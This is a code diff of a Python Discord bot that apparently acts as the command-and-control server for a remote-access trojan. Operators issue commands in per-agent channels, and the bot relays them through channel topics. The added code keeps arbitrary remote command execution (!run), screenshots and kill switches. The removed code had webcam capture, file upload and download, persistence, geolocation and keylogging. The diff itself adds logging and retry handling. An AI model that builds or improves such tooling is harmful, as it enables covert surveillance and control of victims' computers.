@@ -5,8 +5,9 @@ import asyncio
 from aiohttp import web
 from datetime import datetime, timezone, timedelta
 import re
+import logging
 
-# Configuration from environment variables
+# ------------------- CONFIGURATION (from environment) -------------------
 BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 GUILD_ID = int(os.getenv("DISCORD_GUILD_ID", 0))
 CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
@@ -14,10 +15,20 @@ AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
 STALE_THRESHOLD_MINUTES = int(os.getenv("STALE_THRESHOLD_MINUTES", 5))
 PORT = int(os.getenv("PORT", 10000))
 
-if not BOT_TOKEN or not GUILD_ID:
-    raise ValueError("Missing DISCORD_BOT_TOKEN or DISCORD_GUILD_ID")
+if not BOT_TOKEN:
+    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
+if not GUILD_ID:
+    raise ValueError("DISCORD_GUILD_ID environment variable not set")
 
-# Bot setup
+# ------------------- LOGGING SETUP -------------------
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    handlers=[logging.StreamHandler()]
+)
+logger = logging.getLogger("bot")
+
+# ------------------- BOT SETUP -------------------
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
@@ -25,7 +36,26 @@ intents.messages = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-# HTTP health check server
+# ------------------- RATE LIMIT RETRY HELPER -------------------
+async def set_topic_with_retry(channel, topic, max_retries=3):
+    """Attempt to set channel topic, handling rate limits with exponential backoff."""
+    for attempt in range(max_retries):
+        try:
+            await channel.edit(topic=topic)
+            logger.info(f"✅ Topic set to '{topic}' in #{channel.name}")
+            return True
+        except discord.HTTPException as e:
+            if e.status == 429:
+                retry_after = int(e.response.headers.get("Retry-After", 5))
+                logger.warning(f"⏳ Rate limited (attempt {attempt+1}/{max_retries}), waiting {retry_after}s")
+                await asyncio.sleep(retry_after)
+            else:
+                logger.error(f"❌ HTTP error setting topic: {e.status} - {e.text}")
+                raise
+    logger.error(f"❌ Failed to set topic after {max_retries} attempts")
+    return False
+
+# ------------------- HTTP HEALTH SERVER (for Render) -------------------
 async def handle_health(request):
     return web.Response(text="OK")
 
@@ -38,9 +68,9 @@ async def start_http_server():
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
-    print(f"HTTP health check server running on port {PORT}")
+    logger.info(f"Health check server running on port {PORT}")
 
-# Background task to clean stale agents
+# ------------------- BACKGROUND CLEANUP TASK -------------------
 @tasks.loop(minutes=1)
 async def clean_stale_agents():
     guild = bot.get_guild(GUILD_ID)
@@ -56,35 +86,41 @@ async def clean_stale_agents():
                 if msg.author == bot.user and "**Last seen:**" in msg.content:
                     match = re.search(r"\*\*Last seen:\*\*\s*([^\n]+)", msg.content)
                     if not match:
+                        logger.info(f"Deleting {channel.name} (no timestamp)")
                         await channel.delete()
                         break
                     timestamp_str = match.group(1).strip()
                     try:
                         last_seen = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
                         if now - last_seen > timedelta(minutes=STALE_THRESHOLD_MINUTES):
-                            print(f"Deleting {channel.name} (stale)")
+                            logger.info(f"Deleting {channel.name} (stale, last seen {last_seen})")
                             await channel.delete()
-                    except:
+                    except Exception as e:
+                        logger.error(f"Timestamp parse error for {channel.name}: {e}")
                         await channel.delete()
                     break
             else:
+                logger.info(f"Deleting {channel.name} (no heartbeat message)")
                 await channel.delete()
-        except:
-            pass
+        except discord.Forbidden:
+            logger.warning(f"No permission to read history in {channel.name}")
+        except Exception as e:
+            logger.error(f"Error processing {channel.name}: {e}")
 
 @clean_stale_agents.before_loop
 async def before_clean_stale_agents():
     await bot.wait_until_ready()
 
+# ------------------- DISCORD EVENTS -------------------
 @bot.event
 async def on_ready():
-    print(f"Logged in as {bot.user}")
+    logger.info(f"Logged in as {bot.user}")
     guild = bot.get_guild(GUILD_ID)
     if guild:
         control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
         if not control:
             await guild.create_text_channel(CONTROL_CHANNEL_NAME)
-            print(f"Created #{CONTROL_CHANNEL_NAME} channel")
+            logger.info(f"Created #{CONTROL_CHANNEL_NAME} channel")
     clean_stale_agents.start()
 
 @bot.event
@@ -95,7 +131,7 @@ async def on_message(message):
         return
     await bot.process_commands(message)
 
-# ---------- Control Channel Commands ----------
+# ------------------- CONTROL CHANNEL COMMANDS -------------------
 @bot.command(name="agents", help="List all active agents")
 async def list_agents(ctx):
     if ctx.channel.name != CONTROL_CHANNEL_NAME:
@@ -141,7 +177,7 @@ async def kill_all(ctx):
         await ch.edit(topic="cmd:kill")
     await ctx.send(f"Kill signal sent to {len(agent_channels)} agents.")
 
-# ---------- Agent Channel Commands ----------
+# ------------------- AGENT CHANNEL COMMAND LISTENER -------------------
 @bot.listen()
 async def on_message(message):
     if message.author == bot.user:
@@ -152,45 +188,35 @@ async def on_message(message):
         return
 
     content = message.content.strip()
-    # Map user-friendly commands to internal topic commands
-    if content.startswith("!run "):
-        cmd = content[5:].strip()
-        await message.channel.edit(topic=f"cmd:run {cmd}")
-        await message.add_reaction("✅")
-    elif content == "!screenshot":
-        await message.channel.edit(topic="cmd:screenshot")
-        await message.add_reaction("✅")
-    elif content == "!webcam":
-        await message.channel.edit(topic="cmd:webcam")
-        await message.add_reaction("✅")
-    elif content.startswith("!upload "):
-        path = content[8:].strip()
-        await message.channel.edit(topic=f"cmd:upload {path}")
-        await message.add_reaction("✅")
-    elif content.startswith("!download "):
-        args = content[9:].strip()
-        await message.channel.edit(topic=f"cmd:download {args}")
-        await message.add_reaction("✅")
-    elif content == "!persist":
-        await message.channel.edit(topic="cmd:persist")
-        await message.add_reaction("✅")
-    elif content == "!geolocate":
-        await message.channel.edit(topic="cmd:geolocate")
-        await message.add_reaction("✅")
-    elif content == "!keylog_start":
-        await message.channel.edit(topic="cmd:keylog_start")
-        await message.add_reaction("✅")
-    elif content == "!keylog_stop":
-        await message.channel.edit(topic="cmd:keylog_stop")
-        await message.add_reaction("✅")
-    elif content == "!kill":
-        await message.channel.edit(topic="cmd:kill")
-        await message.add_reaction("✅")
-    else:
-        # Not a command; ignore
-        pass
+    logger.info(f"📩 Agent channel message: {content} in #{message.channel.name}")
 
-# ---------- Main ----------
+    try:
+        if content.startswith("!run "):
+            cmd = content[5:].strip()
+            success = await set_topic_with_retry(message.channel, f"cmd:run {cmd}")
+            if success:
+                await message.add_reaction("✅")
+            else:
+                await message.channel.send("❌ Failed to send command after retries.")
+        elif content == "!screenshot":
+            success = await set_topic_with_retry(message.channel, "cmd:screenshot")
+            if success:
+                await message.add_reaction("✅")
+            else:
+                await message.channel.send("❌ Failed to send command after retries.")
+        elif content == "!kill":
+            success = await set_topic_with_retry(message.channel, "cmd:kill")
+            if success:
+                await message.add_reaction("✅")
+            else:
+                await message.channel.send("❌ Failed to send command after retries.")
+        else:
+            logger.debug(f"Ignored non-command: {content}")
+    except Exception as e:
+        logger.exception(f"Unhandled exception in listener: {e}")
+        await message.channel.send("❌ Internal bot error.")
+
+# ------------------- MAIN -------------------
 async def main():
     asyncio.create_task(start_http_server())
     await bot.start(BOT_TOKEN)
